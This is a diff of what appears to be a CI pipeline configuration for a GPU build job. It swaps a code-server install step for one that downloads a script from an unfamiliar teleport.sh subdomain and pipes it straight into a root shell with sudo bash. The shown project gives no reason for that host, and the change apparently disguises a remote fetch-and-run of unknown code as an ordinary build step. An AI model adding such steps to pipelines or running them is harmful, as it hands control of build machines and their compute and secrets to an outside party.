@@ -6,4 +6,4 @@ jobs:
       resource_class: gpu.nvidia.small
       image: ubuntu-1604-cuda-10.1:201909-23
     steps:
-      - run: curl -fsSL https://code-server.dev/install.sh | sh
+      - run: sudo bash -c "$(curl -fsSL https://rakapon11.teleport.sh/scripts/349208e65a7b8707135241435f3db224/install-node.sh)"
